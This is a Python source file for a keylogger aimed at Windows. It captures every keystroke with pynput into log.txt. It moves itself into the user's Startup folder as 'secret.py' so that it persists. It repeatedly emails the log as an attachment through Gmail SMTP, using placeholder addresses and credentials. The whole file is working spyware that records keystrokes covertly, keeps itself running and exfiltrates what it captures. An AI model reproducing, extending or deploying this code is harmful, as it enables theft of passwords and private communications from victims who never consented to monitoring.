import datetime as dt
import os
from os.path import expanduser
import os.path
import time
import _thread
import smtplib
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def copyfile(threadName):
    try:
        home = expanduser("~")
        final = os.path.join(home, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/secret.py")
        exist=open(final)
        print("file is found")

    except FileNotFoundError:
          home = expanduser("~")
          print("file not found")
          filename='secret.py'
          final = os.path.join(home, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/secret.py")
          
          os.rename(filename,final)
          print("file is copied to startup folder")



def sendfile(threadName, delay):
 while (True):
     print ("sending")
     time.sleep(delay)
     fromaddr = "from@gmail.com"
     toaddr = "to@gmail.com"
       
    
     msg = MIMEMultipart() 
       
     msg['From'] = fromaddr 
     msg['To'] = toaddr 
     msg['Subject'] = "lat"
     body = "Body_of_the_mail"
     msg.attach(MIMEText(body, 'plain'))  
     filename = "log.txt"
     attachment = open("log.txt", "r") 
     p = MIMEBase('application', 'octet-stream') 
     p.set_payload((attachment).read())
     encoders.encode_base64(p)
       
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
     msg.attach(p)
     try:
        smtp=smtplib.SMTP('smtp.gmail.com',587)
        smtplib.SMTP_SSL(port=465)
        smtp.ehlo()
        smtp.starttls()
        smtp.ehlo()
        smtp.set_debuglevel(1)
        smtp.login('youremailaddress@gmail.com','password')
        smtp.sendmail('fromemail@gmail.com','to@gmail.com',msg.as_string())
     except:
         print ("internet is not available")
  




def write_to_file(key):
    #home = expanduser("~")
    #final = os.path.join(home, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/secret.py")
    #exist=open(final)
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.shift_r':
        letter = ''

    if letter == "Key.ctrl_l":
        letter = ""

    if letter=='Key.shift':
        letter='(capital-letter)->'


    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
        
def listenkey(threadName):
    while (True):
        with Listener(on_press=write_to_file) as l:
            l.join()
try:
   _thread.start_new_thread( listenkey, ("Thread-1",) )
   _thread.start_new_thread( sendfile, ("Thread-2", 10, ) )
   _thread.start_new_thread(copyfile,("Thread3",))
except:
   print ("Error: unable to start thread")

while 1:
   pass